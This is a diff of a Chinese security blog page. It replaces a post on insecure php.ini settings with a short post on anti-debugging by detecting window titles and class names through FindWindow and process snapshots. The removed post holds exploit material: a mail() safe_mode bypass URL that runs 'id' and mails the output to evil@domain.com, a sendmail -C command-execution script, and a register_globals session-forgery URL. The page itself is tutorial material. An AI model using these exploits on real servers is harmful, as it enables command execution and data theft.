@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="参考链接http://www.jb51.net/article/5102.htmhttp://blog.csdn.net/fz_flower/article/details/49509159 安全模式本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 安全模式http://php.net/manual/zh/features.safe-mode.php保护措施和安全模式ht">
+<meta name="description" content="原理通过FindWindow函数，找到是否存在黑名单中的标题和类名． 涉及的函数FindWindow TerminateProcess GetProAddress OpenProcess Process32First Process32Next CreateToolhelp32Snapshot 流程使用CreateToolhelp32Snapshot拍摄进程快照，在使用 Process32Firs">
 <meta name="keywords" content="php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php.ini的不安全配置">
-<meta property="og:url" content="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/index.html">
+<meta property="og:title" content="反调试之检测标题名和类名">
+<meta property="og:url" content="http://hl0rey.github.io/2018/02/13/反调试之检测标题名和类名/index.html">
 <meta property="og:site_name" content="hl0rey&#39;s blog">
-<meta property="og:description" content="参考链接http://www.jb51.net/article/5102.htmhttp://blog.csdn.net/fz_flower/article/details/49509159 安全模式本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 安全模式http://php.net/manual/zh/features.safe-mode.php保护措施和安全模式ht">
+<meta property="og:description" content="原理通过FindWindow函数，找到是否存在黑名单中的标题和类名． 涉及的函数FindWindow TerminateProcess GetProAddress OpenProcess Process32First Process32Next CreateToolhelp32Snapshot 流程使用CreateToolhelp32Snapshot拍摄进程快照，在使用 Process32Firs">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-11T02:56:35.225Z">
+<meta property="og:updated_time" content="2018-02-13T04:01:08.975Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php.ini的不安全配置">
-<meta name="twitter:description" content="参考链接http://www.jb51.net/article/5102.htmhttp://blog.csdn.net/fz_flower/article/details/49509159 安全模式本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 安全模式http://php.net/manual/zh/features.safe-mode.php保护措施和安全模式ht">
+<meta name="twitter:title" content="反调试之检测标题名和类名">
+<meta name="twitter:description" content="原理通过FindWindow函数，找到是否存在黑名单中的标题和类名． 涉及的函数FindWindow TerminateProcess GetProAddress OpenProcess Process32First Process32Next CreateToolhelp32Snapshot 流程使用CreateToolhelp32Snapshot拍摄进程快照，在使用 Process32Firs">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/"/>
+  <link rel="canonical" href="http://hl0rey.github.io/2018/02/13/反调试之检测标题名和类名/"/>
 
 
 
 
 
-  <title>php.ini的不安全配置 | hl0rey's blog</title>
+  <title>反调试之检测标题名和类名 | hl0rey's blog</title>
   
 
 
@@ -253,7 +253,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/">
+    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/13/反调试之检测标题名和类名/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="hl0rey">
@@ -270,7 +270,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">php.ini的不安全配置</h1>
+          <h1 class="post-title" itemprop="name headline">反调试之检测标题名和类名</h1>
         
 
         <div class="post-meta">
@@ -282,8 +282,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-10T21:27:45+08:00">
-                2018-02-10
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-13T10:27:39+08:00">
+                2018-02-13
               </time>
             
 
@@ -342,92 +342,25 @@
       
 
       
-        <p>参考链接<br><a href="http://www.jb51.net/article/5102.htm" target="_blank" rel="noopener">http://www.jb51.net/article/5102.htm</a><br><a href="http://blog.csdn.net/fz_flower/article/details/49509159" target="_blank" rel="noopener">http://blog.csdn.net/fz_flower/article/details/49509159</a></p>
-<h3 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h3><pre><code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
-</code></pre><p>安全模式<br><a href="http://php.net/manual/zh/features.safe-mode.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.safe-mode.php</a><br>保护措施和安全模式<br><a href="http://php.net/manual/zh/ini.sect.safe-mode.php" target="_blank" rel="noopener">http://php.net/manual/zh/ini.sect.safe-mode.php</a><br>被安全模式限制的函数<br><a href="http://php.net/manual/zh/features.safe-mode.functions.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.safe-mode.functions.php</a></p>
-<ul>
-<li>safe_mode<br>是否启用 PHP 的安全模式。 </li>
-</ul>
-<ul>
-<li><p>safe_mode_allowed_env<em>vars<br>设置某些环境变量可能是潜在的安全缺口。本指令包含有一个逗号分隔的前缀列表。在安全模式下，用户只能改变那些名字具有在这里提供的前缀的环境变量。默认情况下，用户只能设置以 PHP</em> 开头的环境变量（例如 PHP_FOO = BAR）。</p>
-<pre><code>如果本指令为空，PHP 将使用户可以修改任何环境变量！ 
-</code></pre></li>
-<li><p>safe_mode_exec_dir<br>如果 PHP 使用了安全模式，system() 和其它程序执行函数将拒绝启动不在此目录中的程序。必须使用 / 作为目录分隔符，包括 Windows 中。 </p>
-</li>
-</ul>
-<ul>
-<li><p>disable_functions<br>本指令允许你基于安全原因禁止某些函数。接受逗号分隔的函数名列表作为参数。 disable_functions 不受安全模式的影响。 本指令只能设置在 php.ini 中。例如不能将其设置在 httpd.conf。 </p>
-</li>
-<li><p>com.allow_dcom</p>
-<pre><code>自 PHP 4.0.5 起可用
-</code></pre></li>
-</ul>
-<p>如果打开此选项，PHP 将被允许以一个 D-COM（Distributed COM）客户方式操作并允许 PHP 脚本在远程服务器上实例化 COM 对象。</p>
-<h3 id="变量控制"><a href="#变量控制" class="headerlink" title="变量控制"></a>变量控制</h3><ul>
-<li><p>register_global</p>
-<pre><code>在 PHP &lt;= 4.2.3 时是 PHP_INI_ALL。 从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项。    
-</code></pre></li>
-</ul>
-<p>把EGPCS (Environment, GET, POST, Cookie, Server)注册成全局变量．<br>该项不能在脚本中用ini_set()来配置，但是可以用.htaccess来配置，如　php_flag register_globals off. </p>
-<ul>
-<li><p>magic_quotes_gpc</p>
-<pre><code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
-</code></pre></li>
-</ul>
-<p>远近闻名，魔术引号．<br><a href="http://php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc" target="_blank" rel="noopener">http://php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc</a></p>
-<h3 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h3><ul>
-<li><p>allow_url_include<br>php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include<br>允许这几个函数（include, include_once, require, require_once）用通过url来包含文件（FTP,HTTP协议）</p>
-</li>
-<li><p>allow_url_fopen<br><a href="http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen</a></p>
-</li>
-</ul>
-<h3 id="目录配置"><a href="#目录配置" class="headerlink" title="目录配置"></a>目录配置</h3><ul>
-<li><p>expose_php<br>泄漏php版本信息<br>隐藏这个模样的（X-Powered-By: PHP/5.3.7）的相应头．</p>
-</li>
-<li><p>upload_tmp_dir<br>设置临时目录位置</p>
-</li>
-<li><p>open_basedir<br><a href="http://php.net/manual/zh/ini.core.php#ini.open-basedir" target="_blank" rel="noopener">http://php.net/manual/zh/ini.core.php#ini.open-basedir</a><br>将 PHP 所能打开的文件限制在指定的目录树，包括文件本身。本指令不受安全模式打开或者关闭的影响。 </p>
-</li>
-</ul>
-<h3 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h3><ul>
-<li>display_errors<br>是否回显错误，调试的时候打开</li>
-<li>error_reporting<br>错误显示级别</li>
-</ul>
-<h2 id="不安全配置的利用"><a href="#不安全配置的利用" class="headerlink" title="不安全配置的利用"></a>不安全配置的利用</h2><h3 id="safe-mode绕过漏洞"><a href="#safe-mode绕过漏洞" class="headerlink" title="safe_mode绕过漏洞"></a>safe_mode绕过漏洞</h3><p>还有PHP-4.2.2以下到PHP-4.0.5版本都存在PHP mail函数绕过safe_mode限制执行命令漏洞，4.0.5版本开始mail函数增加了第五个参数，由于设计者考虑不周可以突破safe_mode的限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加shell命令就可以了，比如存在PHP脚本evil.php： </p>
-<pre><code>&lt;? mail(&quot;foo@bar,&quot;foo&quot;,&quot;bar&quot;,&quot;&quot;,$bar); ?&gt;  
-</code></pre><p>执行如下的URL： </p>
-<pre><code>http://foo.com/evil.php?bar=;/usr/bin/id|mail evil@domain.com 
-</code></pre><p>这将id执行的结果发送给<br>evil@domain.com </p>
-<p>对于4.0.6至4.2.2的PHP突破safe_mode限制其实是利用了sendmail的-C参数，所以系统必须是使用sendmail。如下的代码能够突破safe_mode限制执行命令： </p>
-<pre><code>&lt;? 
-# 注意，下面这两个必须是不存在的，或者它们的属主和本脚本的属主是一样 
-$script=&quot;/tmp/script123&quot;; 
-$cf=&quot;/tmp/cf123&quot;; 
+        <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通过FindWindow函数，找到是否存在黑名单中的标题和类名．</p>
+<h3 id="涉及的函数"><a href="#涉及的函数" class="headerlink" title="涉及的函数"></a>涉及的函数</h3><p>FindWindow TerminateProcess GetProAddress OpenProcess Process32First Process32Next CreateToolhelp32Snapshot</p>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>使用CreateToolhelp32Snapshot拍摄进程快照，在使用 Process32First和 Process32Next获取进程信息，再用FindWindow查找是否有黑名单上的标题名或者类名，如果发现执行反调试的行为．</p>
+<h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><ul>
+<li><p>FindWindow</p>
+<pre><code>HWNDFindWindow
 
-$fd = fopen($cf, &quot;w&quot;); 
-fwrite($fd, &quot;OQ/tmp 
-Sparse=0 
-R$*&quot; . chr(9) . &quot;$#local $@ $1 $: $1 
-Mlocal, P=/bin/sh, A=sh $script&quot;); 
-fclose($fd); 
+(
 
-$fd = fopen($script, &quot;w&quot;); 
-fwrite($fd, &quot;rm -f $script $cf; &quot;); 
-fwrite($fd, $cmd); 
-fclose($fd); 
+LPCSTRlpClassName, //一个类名
 
-mail(&quot;nobody&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;-C$cf&quot;); 
-?&gt; 
-</code></pre><p>还是使用以上有问题版本PHP的用户一定要及时升级到最新版本，这样才能消除基本的安全问题。  </p>
-<h3 id="全局变量伪造"><a href="#全局变量伪造" class="headerlink" title="全局变量伪造"></a>全局变量伪造</h3><p>test.php</p>
-<pre><code>&lt;?php
-if($_SESSION[&apos;username&apos;]==&quot;admin&quot;){
-    echo &quot;you is admin!&quot;;
-}
-?&gt;
-</code></pre><p>如果register_global模式为On的话，提交：</p>
-<pre><code>http://host/test.php?_SESSION[username]=admin
-</code></pre><p>就能绕过了．</p>
+LPCSTRlpWindowName //一个标题名
+
+);
+</code></pre></li>
+</ul>
+<p>首先按类名寻找，如果类名没有设置，则按标题名．<br>返回那个窗口的句柄．</p>
+<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>如果发现函数列表中没有可疑函数，但是事实上程序执行了相关的操作，那么应该是隐式的函数调用，仔细寻找蛛丝马迹．</p>
+<h3 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h3><p>让函数找不到他想找的就行了．</p>
 
       
     </div>
@@ -443,12 +376,12 @@ if($_SESSION[&apos;username&apos;]==&quot;admin&quot;){
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2018/02/10/php-ini的不安全配置/">php.ini的不安全配置</a></p>
+  <p><span>本文标题:</span><a href="/2018/02/13/反调试之检测标题名和类名/">反调试之检测标题名和类名</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 hl0rey 的个人博客">hl0rey</a></p>
-  <p><span>发布时间:</span>2018年02月10日 - 21:02</p>
-  <p><span>最后更新:</span>2018年02月11日 - 10:02</p>
-  <p><span>原始链接:</span><a href="/2018/02/10/php-ini的不安全配置/" title="php.ini的不安全配置">http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2018年02月13日 - 10:02</p>
+  <p><span>最后更新:</span>2018年02月13日 - 12:02</p>
+  <p><span>原始链接:</span><a href="/2018/02/13/反调试之检测标题名和类名/" title="反调试之检测标题名和类名">http://hl0rey.github.io/2018/02/13/反调试之检测标题名和类名/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://hl0rey.github.io/2018/02/13/反调试之检测标题名和类名/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -492,8 +425,8 @@ if($_SESSION[&apos;username&apos;]==&quot;admin&quot;){
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/02/10/代码审计大的思路/" rel="next" title="代码审计大的思路">
-                <i class="fa fa-chevron-left"></i> 代码审计大的思路
+              <a href="/2018/02/11/代码审计之SQL注入/" rel="next" title="代码审计之SQL注入">
+                <i class="fa fa-chevron-left"></i> 代码审计之SQL注入
               </a>
             
           </div>
@@ -501,10 +434,6 @@ if($_SESSION[&apos;username&apos;]==&quot;admin&quot;){
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/02/11/代码审计之SQL注入/" rel="prev" title="代码审计之SQL注入">
-                代码审计之SQL注入 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -636,7 +565,7 @@ if($_SESSION[&apos;username&apos;]==&quot;admin&quot;){
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#安全模式"><span class="nav-number">1.</span> <span class="nav-text">安全模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量控制"><span class="nav-number">2.</span> <span class="nav-text">变量控制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程文件"><span class="nav-number">3.</span> <span class="nav-text">远程文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录配置"><span class="nav-number">4.</span> <span class="nav-text">目录配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#错误信息"><span class="nav-number">5.</span> <span class="nav-text">错误信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不安全配置的利用"><span class="nav-number"></span> <span class="nav-text">不安全配置的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#safe-mode绕过漏洞"><span class="nav-number">1.</span> <span class="nav-text">safe_mode绕过漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全局变量伪造"><span class="nav-number">2.</span> <span class="nav-text">全局变量伪造</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#涉及的函数"><span class="nav-number">2.</span> <span class="nav-text">涉及的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#流程"><span class="nav-number">3.</span> <span class="nav-text">流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#函数解析"><span class="nav-number">4.</span> <span class="nav-text">函数解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#技巧"><span class="nav-number">5.</span> <span class="nav-text">技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过手法"><span class="nav-number">6.</span> <span class="nav-text">绕过手法</span></a></li></ol></div>
             
 
           </div>
